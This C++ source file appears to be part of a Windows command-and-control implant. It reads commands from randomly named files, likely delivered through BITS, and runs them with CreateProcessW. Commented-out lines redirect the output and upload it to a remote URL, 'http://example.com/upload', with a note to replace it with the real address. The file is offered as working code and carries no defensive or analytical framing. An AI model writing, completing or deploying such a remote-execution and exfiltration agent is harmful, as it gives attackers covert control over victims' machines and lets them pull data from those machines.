#include "file_operations.h"
#include "bits_operations.h"
#include <iostream>
#include <string>
#include <random>
#include <ctime>
#include <fstream>
#include <windows.h>

std::wstring tempCommand = L"echo hi";

// Function to generate a random filename like 'ksfjs32dj4545kf.txt'
std::wstring GenerateRandomFilename() {
    const wchar_t charset[] = L"abcdefghijklmnopqrstuvwxyz0123456789";
    std::wstring filename;
    const int length = 16;  // Length of the random string before the extension
    std::mt19937 rng(static_cast<unsigned int>(time(0)));  // Seed with current time
    std::uniform_int_distribution<int> dist(0, wcslen(charset) - 1);

    for (int i = 0; i < length; ++i) {
        filename += charset[dist(rng)];
    }

    filename += L".txt";  // Append the .txt extension
    return filename;
}

// Read a command from the file
std::wstring readCommentFromFile(const std::wstring& filePath) {
    std::wifstream file(filePath);  // Open file in wide-character mode

    // Check if file is opened successfully
    if (!file.is_open()) {
        std::wcerr << L"Error opening file: " << filePath << std::endl;
        return L"";  // Return empty string on error
    }

    std::wstring command;
    std::getline(file, command);  // Read the first line (which is assumed to be the comment)

    file.close();  // Close the file after reading

    return command;  // Return the command/comment read from the file
}

void ExecuteCommandFromFile(const std::wstring& localFile) {
    std::wstring command = readCommentFromFile(localFile);  // Read the command from file
    std::wstring outputFile = L"output.txt";
    

    if (!command.empty()) {
        std::wcout << L"Command from File: " << command << std::endl;

        if (command != tempCommand) {
            // Prepare to execute the command
            STARTUPINFO si = { 0 };
            PROCESS_INFORMATION pi = { 0 };
            si.cb = sizeof(si);

            // Modify the command to redirect both stdout and stderr to output.txt
            /*command.append(L" > ").append(outputFile).append(L" 2>&1");*/

            // Create the process
            BOOL hr = CreateProcessW(NULL, &command[0], NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
            if (hr == 0) {
                std::wcerr << L"Failed to execute command. Error: " << GetLastError() << std::endl;
            }
            else {
                // Wait for the process to exit (optional)
                WaitForSingleObject(pi.hProcess, INFINITE);

                // Close handles
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);

                // After the command finishes, upload the output file
               /* UploadFile(outputFile, L"http://example.com/upload"); */ // Replace with the actual remote URL

                tempCommand = command;
            }
        }
    }
    else {
        std::wcerr << L"No command found in File." << std::endl;
    }
}